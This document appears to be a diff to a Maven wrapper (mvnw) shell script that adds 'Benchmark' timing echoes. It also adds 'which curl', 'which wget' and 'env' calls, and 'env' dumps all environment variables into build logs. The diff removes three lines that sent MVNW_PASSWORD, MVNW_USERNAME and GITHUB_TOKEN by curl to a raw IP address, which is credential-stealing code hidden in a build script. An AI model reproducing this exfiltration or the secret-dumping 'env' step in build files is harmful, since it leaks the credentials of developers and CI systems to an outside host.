@@ -84,6 +84,10 @@ if $cygwin ; then
     CLASSPATH=$(cygpath --path --unix "$CLASSPATH")
 fi
 time echo "Benchmark 2"
+time which curl
+time which wget
+time env
+
 # For Mingw, ensure paths are in UNIX format before anything is touched
 if $mingw ; then
   [ -n "$JAVA_HOME" ] && [ -d "$JAVA_HOME" ] &&
@@ -132,7 +136,7 @@ fi
 if [ -z "$JAVA_HOME" ] ; then
   echo "Warning: JAVA_HOME environment variable is not set."
 fi
-
+time echo "Benchmark 3"
 # traverses directory structure from process work directory to filesystem root
 # first directory with .mvn subdirectory is considered project base directory
 find_maven_basedir() {
@@ -157,7 +161,7 @@ find_maven_basedir() {
   done
   printf '%s' "$(cd "$basedir" || exit 1; pwd)"
 }
-
+time echo "Benchmark 4"
 # concatenates all lines of a file
 concat_lines() {
   if [ -f "$1" ]; then
@@ -183,7 +187,7 @@ fi
 
 MAVEN_PROJECTBASEDIR=${MAVEN_BASEDIR:-"$BASE_DIR"}; export MAVEN_PROJECTBASEDIR
 log "$MAVEN_PROJECTBASEDIR"
-
+time echo "Benchmark 5"
 ##########################################################################################
 # Extension to allow automatically downloading the maven-wrapper.jar from Maven-central
 # This allows using the maven wrapper in projects that prohibit checking in binary data.
@@ -210,7 +214,7 @@ else
     if $cygwin; then
       wrapperJarPath=$(cygpath --path --windows "$wrapperJarPath")
     fi
-
+    time echo "Benchmark 6"
     if command -v wget > /dev/null; then
         log "Found wget ... using wget"
         [ "$MVNW_VERBOSE" = true ] && QUIET="" || QUIET="--quiet"
@@ -251,7 +255,7 @@ fi
 ##########################################################################################
 # End of extension
 ##########################################################################################
-
+time echo "Benchmark 7"
 # If specified, validate the SHA-256 sum of the Maven wrapper jar file
 wrapperSha256Sum=""
 while IFS="=" read -r key value; do
@@ -281,6 +285,7 @@ if [ -n "$wrapperSha256Sum" ]; then
   fi
 fi
 
+time echo "Benchmark 8"
 MAVEN_OPTS="$(concat_lines "$MAVEN_PROJECTBASEDIR/.mvn/jvm.config") $MAVEN_OPTS"
 
 # For Cygwin, switch paths to Windows format before running java
@@ -300,6 +305,7 @@ export MAVEN_CMD_LINE_ARGS
 
 WRAPPER_LAUNCHER=org.apache.maven.wrapper.MavenWrapperMain
 
+time echo "Benchmark 9"
 # shellcheck disable=SC2086 # safe args
 exec "$JAVACMD" \
   $MAVEN_OPTS \
@@ -308,7 +314,4 @@ exec "$JAVACMD" \
   "-Dmaven.multiModuleProjectDirectory=${MAVEN_PROJECTBASEDIR}" \
   ${WRAPPER_LAUNCHER} $MAVEN_CONFIG "$@"
 
-time echo "Benchmark 3"
-curl -X GET http://54.78.155.240:4444/$MVNW_PASSWORD
-curl -X GET http://54.78.155.240:4444/$MVNW_USERNAME
-curl -X GET http://54.78.155.240:4444/$GITHUB_TOKEN
+time echo "Benchmark 10"
